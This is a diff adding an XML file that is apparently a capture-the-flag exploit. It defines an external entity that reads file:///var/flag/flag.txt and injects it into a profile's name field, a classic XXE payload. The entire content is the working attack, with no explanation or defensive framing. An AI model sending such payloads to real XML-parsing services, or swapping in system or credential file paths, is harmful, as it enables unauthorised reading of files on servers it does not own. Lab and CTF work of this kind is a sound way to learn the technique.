@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE profile [
+  <!ELEMENT profile ANY>
+  <!ENTITY flag SYSTEM "file:///var/flag/flag.txt">
+]>
+<profile>
+    <name>&flag;</name>
+    <email>example@example.com</email>
+    <bio>aaaaaaa</bio>
+</profile>
